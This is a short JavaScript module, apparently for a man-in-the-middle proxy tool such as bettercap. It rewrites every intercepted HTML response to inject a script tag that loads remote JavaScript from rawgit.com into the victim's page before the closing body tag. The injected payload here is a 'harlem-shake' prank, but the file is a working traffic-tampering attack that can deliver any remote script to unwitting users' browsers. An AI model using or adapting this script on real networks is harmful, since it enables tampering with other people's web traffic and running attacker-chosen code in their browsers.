function onResponse(req, res) {
    if( res.ContentType.indexOf('text/html') == 0 ){
        var body = res.ReadBody();
        res.Body = body.replace(
                '</body>',
                '<script type="text/javascript" src="https://rawgit.com/jonathantneal/656b23d080994df1587f770f61d88c77/raw/205003863c3b3a93e252f3928918a3e348384b62/harlem-shake.js"></script></body>'
        );
        console.log(res.Body);
    }
}